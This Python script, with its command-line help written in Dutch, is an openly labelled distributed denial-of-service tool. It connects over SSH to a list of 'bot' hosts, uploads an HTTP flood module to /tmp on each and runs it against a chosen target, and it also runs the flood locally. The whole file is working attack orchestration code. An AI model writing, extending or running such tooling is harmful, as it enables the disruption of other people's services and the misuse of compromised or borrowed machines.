import paramiko
import argparse
from http_bot_module import execute_http_dos
def load_target_bot_list(list):
    bot_list = []
    lines = list.split("\r\n")
    for line in lines:
        line = line.strip()
        if not line:
            continue
        bot_ip, bot_port, username = line.split(":")
        bot_list.append((bot_ip, bot_port, username))
    return bot_list

def check_for_python(ssh_client, bot_ip):
    # Run the Python version command remotely
    stdin, stdout, stderr = ssh_client.exec_command('python3 --version')
    # Check the output to see if Python is installed
    out = stdout.read().decode().strip()
    err = stderr.read().decode().strip()
    if out.startswith('Python') or err.startswith('Python'):
        print(f"Python is installed on {bot_ip}")
        return True
    else:
        print(f"Python is not installed on {bot_ip}")
        return False

def create_ddos(target_host, target_port, bot_list, pvkey, password):
    for bot_tupple in bot_list:
        bot_ip, bot_port, username = bot_tupple

        # Create an SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the remote host
        private_key = paramiko.RSAKey.from_private_key_file(filename=pvkey,password=password)
        ssh_client.connect(hostname=bot_ip, port=bot_port, username=username, pkey=private_key)

        python_exsists = check_for_python(ssh_client, bot_ip)

        if python_exsists:
            ssh_client.exec_command('pip3 install psutil')
            # Open an SFTP connection
            sftp = ssh_client.open_sftp()
            # Upload the Python script to the /tmp/ directory on the remote host
            sftp.put("modules/dos/http_bot_module.py", "/tmp/http_bot_module.py")
            # Close the SFTP connection
            sftp.close()

            stdin, stdout,sdterr = ssh_client.exec_command(f"python3 /tmp/http_bot_module.py {target_host} {target_port}")
            print(target_host, target_port)
            execute_http_dos(target_host,target_port)

        # Close the SSH connection
        ssh_client.close()

def start_dos_script(target_host, target_port, isDistributed=False, bot_list="", pvkey="",password=""):
    target_port = int(target_port)
    if isDistributed:
        create_ddos(target_host,target_port,load_target_bot_list(bot_list), pvkey, password)
    else:
        execute_http_dos(target_host,target_port)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script voor Gedistribueerde Denial of Service (DDoS) aanvallen")
    parser.add_argument("target_host", type=str, help="IP-adres of domein van het doelwit")
    parser.add_argument("target_port", type=int, help="Poort van het doelwit")
    parser.add_argument("--distributed", action="store_true", help="Schakel gedistribueerde aanvalmodus in")
    parser.add_argument("--bot_list", type=str, help="Lijst van bots in het formaat 'IP:Poort:Gebruikersnaam'")
    parser.add_argument("--private_key", type=str, help="Pad naar het bestand met de privésleutel")
    parser.add_argument("--password", type=str, help="Wachtwoord voor het bestand met de privésleutel")

    args = parser.parse_args()
    start_dos_script(args.target_host, args.target_port, args.distributed, args.bot_list, args.private_key, args.password)
